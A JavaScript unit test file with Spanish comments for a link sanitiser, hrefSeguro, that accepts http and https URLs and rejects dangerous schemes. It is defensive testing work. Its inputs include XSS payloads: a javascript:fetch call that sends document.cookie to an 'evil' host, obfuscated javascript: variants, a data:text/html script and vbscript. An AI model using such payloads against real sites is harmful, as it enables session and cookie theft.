// ============================================================
//  Pruebas de lib/enlaceSeguro.js — el filtro de href del contenido
// ------------------------------------------------------------
//  Módulo puro: corre con `npm test`, sin emulador ni navegador.
// ============================================================
import { test } from 'node:test'
import assert from 'node:assert/strict'
import { hrefSeguro } from '../src/lib/enlaceSeguro.js'

test('acepta http y https y devuelve la URL normalizada', () => {
  assert.equal(hrefSeguro('https://ejemplo.org/guia.pdf'), 'https://ejemplo.org/guia.pdf')
  assert.equal(hrefSeguro('http://ejemplo.org/a?b=1#c'), 'http://ejemplo.org/a?b=1#c')
  // Normaliza: un dominio pelado gana su barra final.
  assert.equal(hrefSeguro('https://ejemplo.org'), 'https://ejemplo.org/')
  // Los espacios sobrantes no invalidan un enlace legítimo.
  assert.equal(hrefSeguro('  https://ejemplo.org/x  '), 'https://ejemplo.org/x')
})

test('rechaza javascript: en todas sus formas ofuscadas', () => {
  // El vector directo del informe de auditoría.
  assert.equal(hrefSeguro('javascript:fetch("https://evil/"+document.cookie)'), null)
  // Mayúsculas: el parser normaliza el esquema antes de que lo miremos.
  assert.equal(hrefSeguro('JavaScript:alert(1)'), null)
  assert.equal(hrefSeguro('JAVASCRIPT:alert(1)'), null)
  // Espacio inicial (lo comía el trim y antes pasaba como "relativa").
  assert.equal(hrefSeguro('  javascript:alert(1)'), null)
  // Tabuladores y saltos de línea EN MEDIO del esquema: el parser de URL los
  // descarta, así que "java\nscript:" se revela como javascript: y cae aquí.
  assert.equal(hrefSeguro('java\nscript:alert(1)'), null)
  assert.equal(hrefSeguro('java\tscript:alert(1)'), null)
})

test('rechaza los demás esquemas peligrosos', () => {
  assert.equal(hrefSeguro('data:text/html,<script>alert(1)</script>'), null)
  assert.equal(hrefSeguro('vbscript:msgbox(1)'), null)
  assert.equal(hrefSeguro('file:///C:/Windows/System32'), null)
  assert.equal(hrefSeguro('blob:https://ejemplo.org/abc'), null)
})

test('rechaza lo vacío, lo nulo y lo que no es una URL', () => {
  assert.equal(hrefSeguro(''), null)
  assert.equal(hrefSeguro('   '), null)
  assert.equal(hrefSeguro(null), null)
  assert.equal(hrefSeguro(undefined), null)
  assert.equal(hrefSeguro('no es una url'), null)
  // Relativas: estos href del contenido son SIEMPRE externos.
  assert.equal(hrefSeguro('/descargas/guia.pdf'), null)
  assert.equal(hrefSeguro('//ejemplo.org/guia.pdf'), null)
})

test('no revienta con valores que no son texto', () => {
  assert.equal(hrefSeguro(42), null)
  assert.equal(hrefSeguro({}), null)
  assert.equal(hrefSeguro([]), null)
  assert.equal(hrefSeguro(true), null)
})

test('coincide con urlSegura del editor en los casos que importan', async () => {
  // urlSegura() valida al GUARDAR y hrefSeguro() al RENDERIZAR. No tienen por
  // qué ser idénticas (urlSegura no normaliza), pero lo que una rechaza por
  // peligroso la otra no debe aceptarlo.
  const { urlSegura } = await import('../src/lib/temaContenidoModelo.js')
  const peligrosas = [
    'javascript:alert(1)',
    'JavaScript:alert(1)',
    'data:text/html,<script>alert(1)</script>',
    'vbscript:msgbox(1)',
    '/relativa.pdf',
  ]
  for (const u of peligrosas) {
    assert.equal(urlSegura(u), false, `urlSegura debería rechazar ${u}`)
    assert.equal(hrefSeguro(u), null, `hrefSeguro debería rechazar ${u}`)
  }
})
